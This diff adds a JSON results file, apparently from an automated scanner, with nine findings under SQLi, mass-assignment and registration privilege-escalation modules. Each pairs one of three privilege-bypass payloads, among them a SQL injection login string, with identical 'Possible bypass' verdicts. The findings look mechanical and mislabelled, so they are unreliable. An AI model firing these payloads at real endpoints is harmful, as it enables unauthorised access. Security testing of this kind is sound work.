@@ -1,0 +1,65 @@
+[
+  {
+    "module": "SQLi",
+    "payload": "\"email\":\"admin' OR '1'='1' --\"",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "SQLi",
+    "payload": "\"role\":\"admin\"",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "SQLi",
+    "payload": "\"is_admin\":true",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "MassAssignment",
+    "payload": "\"email\":\"admin' OR '1'='1' --\"",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "MassAssignment",
+    "payload": "\"role\":\"admin\"",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "MassAssignment",
+    "payload": "\"is_admin\":true",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "RegistrationPrivEsc",
+    "payload": "\"email\":\"admin' OR '1'='1' --\"",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "RegistrationPrivEsc",
+    "payload": "\"role\":\"admin\"",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  },
+  {
+    "module": "RegistrationPrivEsc",
+    "payload": "\"is_admin\":true",
+    "response_status": 200,
+    "vulnerability": "Possible bypass",
+    "cvss": 7.5
+  }
+]
